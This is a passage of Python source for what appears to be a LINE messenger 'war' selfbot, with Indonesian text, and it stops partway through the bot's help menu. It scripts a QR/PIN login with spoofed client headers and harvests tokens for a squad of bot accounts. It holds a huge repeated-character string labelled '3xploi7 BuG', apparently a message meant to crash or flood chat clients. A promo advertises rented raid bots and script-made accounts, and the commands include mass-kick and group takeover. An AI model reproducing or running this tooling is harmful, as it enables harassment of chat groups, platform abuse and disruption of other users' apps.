from queue import Queue
import threading
import time, os, sys, json,ast
import socket
import select,random,orjson,pytz
import signal ,subprocess,platform,concurrent.futures
from datetime import datetime, timedelta
from dateutil.relativedelta import relativedelta
from dateutil import parser
from upfoto import *
# service
from service.ttypes import *
from service import LineService 
###new get token####
from typing import Callable, Dict, Any
from lesting.api.client import build
class LoginResult:
	certificate: str
	accessToken: str
	lastBindTimestamp: int
	metaData: Dict[str, str]
HOST = "https://legy-jp.line.naver.jp"
PATH = HOST + "/acct/lgn/sq/v1"
POLL = HOST + "/acct/lp/lgn/sq/v1"
HEADERS = {"lite": {"user-agent": "LLA/2.16.0","x-line-application": "ANDROIDLITE\t2.16.0\tAndroid OS\t10;SECONDARY"}}    
pclient = build("line.login", "v1")

Token= []
def getRequest(method: str, headers: Dict[str, str], *, lp: bool = False, **kwargs: Dict[str, Any]) -> Any:
	return getattr(pclient.parser, method)((pclient.http.request((POLL if lp else PATH), "POST", getattr(pclient.packer, method)(**kwargs), headers)[1]))
def loginWithQrCode(application: str, certificate: str = "", web: bool = False, callback: Callable = lambda output: Token.append("{}".format(output))) -> LoginResult:
	headers = HEADERS[application]
	session = getRequest("createSession", headers)
	result = getRequest("createQrCode", headers, session = session)
	callback(result.url)
	if web:
		callback(result.web)
	getRequest("checkQrCodeVerified", {**headers, **{"x-line-access": session}}, lp = True, session = session)
	try:
		getRequest("verifyCertificate", headers, session = session, certificate = certificate)
	except:
		pin = getRequest("createPinCode", headers, session = session)
		if web:
			pclient.pin.update(session, pin)
		else:
			callback(pin)
		getRequest("checkPinCodeVerified", {**headers, **{"x-line-access": session}}, lp = True, session = session)
	return getRequest("qrCodeLogin", headers, session = session, systemName = headers["x-line-application"].split("\t")[2], autoLoginIsRequired = True) 
    
def getTime():
    tz = pytz.timezone("Asia/Jakarta")
    timeNow = datetime.now(tz=tz)
    timeHours = datetime.strftime(timeNow,"(%H:%M)")
    day = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday","Friday", "Saturday"]
    hari = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"]
    bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
    inihari = datetime.now(tz=tz)
    hr = inihari.strftime('%A')
    bln = inihari.strftime('%m')
    for i in range(len(day)):
        if hr == day[i]: hasil = hari[i]
    for k in range(0, len(bulan)):
        if bln == str(k): bln = bulan[k-1]
    timer = hasil + ", " + inihari.strftime('%d') + " - " + bln + " - " + inihari.strftime('%Y') + " | " + inihari.strftime('%H:%M:%S')
    return timer
class Node:
    def __init__(self, lesting, client, sockaddr,file):
        self.lesting = lesting
        self.client = client
        self.operations = Queue()
        self.running = False
        with open("data.json", "rb") as r:
        	self.set = json.load(r)
        with open("lop.json", "rb") as r:
        	self.ser = json.load(r)
        try:self.lastmsg = self.set["lastmsg"]
        except:
        	self.set["lastmsg"] = ""
        try:self.lastmsg = self.set["resadd"]
        except:
        	self.set["resadd"] = ""
        try:self.purge = self.set["purge"]
        except:
        	self.set["purge"] = False
        	self.purge = self.set["purge"]
        self.numSquad = self.ser["token"]
        self.master = self.set["master"]
        self.G_ticket = self.set["G_ticket"]
        self.Link = ""
        self.protect = self.set["protect"]
        self.terkick = {}
        self.ws = self.set["ws"]
        self.mid = self.client.Mid
        self.wartTime = round(time.time())
        self.resend = {}
        self.multy = False
        self.version = "2.2.8"
        self.Note  = """
• fix backup all mode
• rombak2"""
        self.loger = []
        self.online = True
        self.CMD = {"keyCommand":""}
        self.makers = ["uaeb13e65206ec181514d42e278843567","u5f5ed5ad97bbf907f70a222ca9bc8de8","u76d9dc7ba456668e75595396323679f1"]
        self.upgradeSc = {"status":False,"group":None,"local":""}
        self.sockaddr = sockaddr
        self.file = str(file)
        self.blacklist = {}
        self.jaVa =True
        self.btamps = False
        self.msgId = ""
        
        # send username
        
        self.queues = {}
        self.beckupQr = self.set["turbo"]
        self.Fast = self.set["fast"]
        self.force = self.set["force"]
        if self.set["squad"] != {}:
        	self.Squad = {mid for mid in self.set["squad"] if mid not in self.mid}
        else:self.Squad = {}
        self.war = {}
        if 0 == self.set["count"]["runtime"]:
        	self.set["count"]["runtime"] += time.time()
        self.starting = self.set["count"]["runtime"]
        self.lastSquadTime = {}
        try:
        	self.client.count["kick"] += self.set["count"]["kick"]
        	self.client.count["cancel"] += self.set["count"]["cancel"]
        	self.client.count["invite"] += self.set["count"]["invite"]
        	self.client.count["msg"] += self.set["count"]["msg"]
        	self.client.count["accept"] += self.set["count"]["accept"]
        	self.client.count["allreq"] += self.set["count"]["allreq"]
        except:
        	self.set["count"]["accept"] = 0
        	self.set["count"]["allreq"] = 0
        	self.client.count["kick"] += self.set["count"]["kick"]
        	self.client.count["cancel"] += self.set["count"]["cancel"]
        	self.client.count["invite"] += self.set["count"]["invite"]
        	self.client.count["msg"] += self.set["count"]["msg"]
        	self.client.count["accept"] += self.set["count"]["accept"]
        	self.client.count["allreq"] += self.set["count"]["allreq"]
        self.upfoto = False
        self.Gmid = ""
        self.remotGroup = ""
        try:
        		if self.set["linkSquad"] != {}:
        			for gc in self.set["linkSquad"]:
        				ticket = self.set["linkSquad"][gc]
        				mid = gc
        				if mid not in self.client.getAllChatMids(True).memberChatMids:
        					self.client.acceptChatInvitationByTicket(mid,ticket)
        				self.client.sendMessage(mid,"🙄")
        				self.set["linkSquad"] = {}
        except:
        		self.set["linkSquad"] = {}
        if self.set["steal"]["logo"] == "":
        	self.logo = self.client.logo
        else:
        	self.logo = self.set["steal"]["logo"]
        	self.client.logo = self.logo
        if self.set["steal"]["prefix"] != "":
        	self.lesting.storage.command["prefix"] = self.set["steal"]["prefix"]
        if self.mid in self.set["count"]["duedate"]:
        	if self.set["count"]["duedate"][self.mid] == "":
        		self.duedate = parser.parse(str(datetime.now()))
        	else:
        		self.duedate = parser.parse(str(self.set["count"]["duedate"][self.mid]))
        		self.client.limit = True
        else:
        	self.set["count"]["duedate"][self.mid] = ""
        	self.duedate = parser.parse(str(datetime.now()))
        	#time.sleep(1);self.sock.sendall(str({"func":"starting","userBots":self.mid,"status":self.client.limit}).encode("utf-8"))
        self.covid =""".1.2.3.4.5.6.7.8.9.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.

 Hello!
3xploi7 BuG
.1.2.3.4.5.6.7.8.9.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J. Hello!
3xploi7 BuG
.1.2.3.4.5.6.7.8.9.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.1.B.2.D.3.E.4.F.5.G.6.H.7.I.8.J.9.K.0.A.
"""
        self.promo = """╭◤ RENTAL WAR/PROTECT ◥
│• 6bot = R̶p̶.̶4̶0̶0̶K̶ (300K/MONTH)
│• 9bot = R̶p̶.̶6̶0̶0̶K̶ (500K/MONTH)
│• 12bot = R̶p̶.̶7̶5̶0̶K̶(600K/MONTH) 
├「 RENTAL APP
│• paket 1 
│• paket 2 
│• paket 3
├「 PANEL
│• GCLOUD
│• VULTR
│• LINODE
├「 ACCOUNT LINE
│• create with script = 30 token = 100k
│	nb: max 5 account/set already add
│• create with hand = 20 token = 100k
│	nb: max 50 account/set already add
├「 SELFBOT
│• TEMP/NO TEMP = 50K/MONTH
│NB :
│  𝗕𝗢𝗧 𝗧𝗜𝗗𝗔𝗞 𝗠𝗨𝗗𝗔𝗛 𝗟𝗜𝗠𝗜𝗧/
│  𝗕𝗔𝗡𝗖𝗛𝗔𝗧
│  𝗝𝗘𝗡𝗜𝗦 𝗕𝗢𝗧 𝗖𝗟 (python++)
│  𝗗𝗔𝗡 𝗠𝗘𝗡𝗚𝗚𝗨𝗡𝗔𝗞𝗔𝗡 𝗦𝗬𝗦𝗧𝗘𝗠
│  𝗦𝗘𝗥𝗩𝗘𝗥 𝗧𝗖𝗣/𝗨𝗗𝗣
│  𝗕𝗢𝗧 𝗧𝗜𝗗𝗔𝗞 𝗡𝗚𝗘𝗕𝗨𝗚 (𝗶𝗻𝘃𝗶𝘁𝗲/𝗷𝗼𝗶𝗻)
│  𝗦𝗬𝗦𝗧𝗘𝗠 𝗕𝗔𝗖𝗞𝗨𝗣 𝗥𝗔𝗣𝗜𝗛 𝗗𝗔𝗡
│  𝗧𝗘𝗥𝗔𝗧𝗨𝗥
│  𝗕𝗢𝗧 𝗦𝗨𝗗𝗔𝗛 𝗠𝗘𝗡𝗚𝗚𝗨𝗡𝗔𝗞𝗔𝗡
│  - kick by replay (text/sticker)
│  - respon by sticker
│  - leaveall by sticker
│  - DLL
├──────────────
│payment
│• Paypal
│• Bank Indonesia
│
│contact us personally
│ 「 https://line.me/ti/p/rvoFBnRo76 」
╰ ◣ {logo} ◢""".format(logo=self.logo)
    def helpMessage(self,sender):
    	return """╭ ◤☢️𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦☢️◥
│ 𝐮𝐬𝐞𝐫 : {user}
│ 𝐛𝐨𝐭𝐬 𝐜𝐨𝐮𝐮𝐭 : {count}/squad
│ 𝐬𝐪𝐮𝐚𝐝 𝐧𝐮𝐦𝐛: {numSquad}
│ 𝐬𝐲𝐬𝐧𝐚𝐦𝐞: {file}
│ 𝐯𝐞𝐫𝐬𝐢𝐨𝐧: 𝐛𝐞𝐭𝐚 {versi} ex cPY++
│ 𝐚𝐜𝐜𝐨𝐦𝐩𝐚𝐧𝐢𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐩𝐫𝐞𝐟𝐢𝐱「 {pref} 」
├「 𝐆𝐄𝐍𝐄𝐑𝐀𝐋 」
│▸ help
│▸ cb
│▸ join
│▸ kick @target
│▸ bkick @target
│▸ invite
│▸ sp
│▸ say> (you text)
│▸ sname
├「 𝐆𝐑𝐎𝐔𝐏𝐒 」
│▸ groups
│▸ gurl (number group)
│▸ f*ck (for kickall)
│▸ link
│▸ ws
│▸ getme
│▸ bye
│▸ out
│▸ stay (count)
│▸ leftallgroup
│▸ http:(link group)
│▸ sentil (kick by replay)
├「 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 」
│▸ set scb (Reply sticker)
│▸ set srp :(text) (Reply sticker)
│▸ set sbyall (Reply sticker)
│▸ set skick (Reply sticker)
│▸ set lmsg : (Text)
│▸ set resadd : (Text)
│▸ set scomd :(text)
│▸ upsymbol: (text)
│▸ upprefix (symbol)
│▸ putsquad (↰)(token)
│▸ fix
│▸ update
